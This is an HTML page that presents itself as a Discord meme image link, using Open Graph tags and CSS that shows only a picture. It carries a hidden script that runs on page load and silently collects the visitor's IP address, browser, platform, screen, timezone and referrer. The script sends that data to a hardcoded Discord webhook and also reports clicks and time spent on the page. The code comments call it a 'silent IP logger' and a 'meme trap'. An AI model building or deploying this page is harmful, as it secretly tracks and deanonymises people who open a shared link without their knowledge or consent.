<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- CRITICAL: This makes Discord show the image -->
    <meta property="og:title" content="Epic Meme">
    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPCMP28hh2vRdgqp1fSP0FfXWA6-so14pUEQ&s">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="800">
    <meta property="og:image:height" content="600">
    <meta property="og:url" content="https://YOUR-VERCEL-URL.vercel.app">
    <meta property="og:description" content="best meme ever">
    
    <!-- Twitter card for extra compatibility -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPCMP28hh2vRdgqp1fSP0FfXWA6-so14pUEQ&s">
    
    <title>meme</title>
    
    <style>
        /* Hide ALL normal HTML elements - only show the image */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: black;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, -apple-system, 'Segoe UI', monospace;
        }
        
        /* The image takes up the whole screen like a normal image link */
        .meme-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            background: black;
        }
        
        .meme-image {
            max-width: 100%;
            max-height: 100vh;
            width: auto;
            height: auto;
            display: block;
            margin: 0 auto;
            cursor: pointer;
            /* No borders, no effects - just raw image */
        }
        
        /* Hidden logger UI - invisible to user */
        .hidden-logger {
            display: none;
        }
        
        /* Optional: tiny watermark only visible on hover (for you to know it's working) */
        .debug-badge {
            position: fixed;
            bottom: 5px;
            right: 5px;
            background: rgba(0,0,0,0.3);
            color: #0f0;
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
            pointer-events: none;
            z-index: 9999;
            opacity: 0.3;
        }
        .debug-badge:hover { opacity: 1; }
    </style>
</head>
<body>
    <div class="meme-container">
        <!-- The exact same image Discord shows -->
        <img class="meme-image" 
             src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPCMP28hh2vRdgqp1fSP0FfXWA6-so14pUEQ&s" 
             alt="meme"
             id="mainImage">
    </div>
    <div class="debug-badge" id="debugBadge">🔒 logging inactive</div>

    <script>
        // ==============================================
        // SILENT IP LOGGER - NO VISUAL INDICATORS
        // ==============================================
        
        // REPLACE THIS WITH YOUR REAL DISCORD WEBHOOK
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1493928181592228022/W9jjIXFWF0FR9a549OxkEc0FxYpOcz8jvw2yWBWmtuiy2wIsXjAKCyBy9jjFoDCV01iN";
        
        // Optional: only log each IP once per session (prevents spam)
        const LOG_ONCE_PER_SESSION = true;
        
        // Function to get user's IP using multiple fallback APIs
        async function getUserIP() {
            const apis = [
                'https://api.ipify.org?format=json',
                'https://api.my-ip.io/ip.json',
                'https://ipapi.co/json/'
            ];
            
            for (let api of apis) {
                try {
                    const response = await fetch(api, { mode: 'cors', cache: 'no-store' });
                    const data = await response.json();
                    const ip = data.ip || data.ipAddress || data;
                    if (ip && typeof ip === 'string') return ip;
                } catch(e) { console.log('IP API failed:', api); }
            }
            return '0.0.0.0';
        }
        
        // Get extra browser data (for the webhook message)
        function getBrowserData() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'direct',
                timestamp: new Date().toISOString(),
                url: window.location.href
            };
        }
        
        // Send everything to Discord webhook
        async function sendToDiscord(ip, browserData) {
            if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('YOUR_ID')) {
                console.warn('Webhook not configured');
                document.getElementById('debugBadge').innerHTML = '⚠️ no webhook';
                return;
            }
            
            const payload = {
                content: null,
                embeds: [{
                    title: '🎯 New Visitor',
                    color: 0x00ff41,
                    fields: [
                        { name: '🌐 IP Address', value: `\`${ip}\``, inline: true },
                        { name: '🖥️ Platform', value: browserData.platform, inline: true },
                        { name: '🌍 Language', value: browserData.language, inline: true },
                        { name: '📱 Screen', value: browserData.screen, inline: true },
                        { name: '🕒 Timezone', value: browserData.timezone, inline: true },
                        { name: '🔗 Referrer', value: browserData.referrer.substring(0, 100), inline: false },
                        { name: '📍 Full URL', value: browserData.url, inline: false },
                        { name: '🛠️ User Agent', value: `\`\`\`${browserData.userAgent.substring(0, 200)}\`\`\``, inline: false }
                    ],
                    footer: { text: 'Meme Trap Logger' },
                    timestamp: browserData.timestamp
                }],
                username: 'Meme Logger',
                avatar_url: 'https://i.imgur.com/4M34hi2.png'
            };
            
            try {
                const response = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    console.log('IP logged successfully');
                    document.getElementById('debugBadge').innerHTML = '✅ logged';
                    setTimeout(() => {
                        document.getElementById('debugBadge').innerHTML = '🔒 idle';
                    }, 3000);
                } else {
                    console.error('Webhook failed:', response.status);
                    document.getElementById('debugBadge').innerHTML = '❌ webhook err';
                }
            } catch(err) {
                console.error('Send failed:', err);
                document.getElementById('debugBadge').innerHTML = '❌ send failed';
            }
        }
        
        // Main execution - SILENT, NO POPUPS, NO ALERTS
        (async function silentLogger() {
            // Check if we already logged this session (optional)
            if (LOG_ONCE_PER_SESSION && sessionStorage.getItem('meme_logged')) {
                console.log('Already logged this session');
                document.getElementById('debugBadge').innerHTML = '🔁 cached';
                return;
            }
            
            try {
                const ip = await getUserIP();
                const browserData = getBrowserData();
                await sendToDiscord(ip, browserData);
                
                if (LOG_ONCE_PER_SESSION) {
                    sessionStorage.setItem('meme_logged', 'true');
                }
            } catch(err) {
                console.error('Logger error:', err);
                document.getElementById('debugBadge').innerHTML = '💀 error';
            }
        })();
        
        // Optional: log when user clicks the image (extra data point)
        document.getElementById('mainImage')?.addEventListener('click', () => {
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    content: `🖱️ **Click event** - User clicked the meme image at ${new Date().toISOString()}`
                })
            }).catch(e => console.log);
        });
        
        // Also log on page unload (time spent on page)
        window.addEventListener('beforeunload', () => {
            const timeSpent = Math.round((Date.now() - window.performance.timing.navigationStart) / 1000);
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    content: `⏱️ **Exit** - User spent ${timeSpent} seconds on page`
                })
            }).catch(e => console.log);
        });
    </script>
</body>
</html>
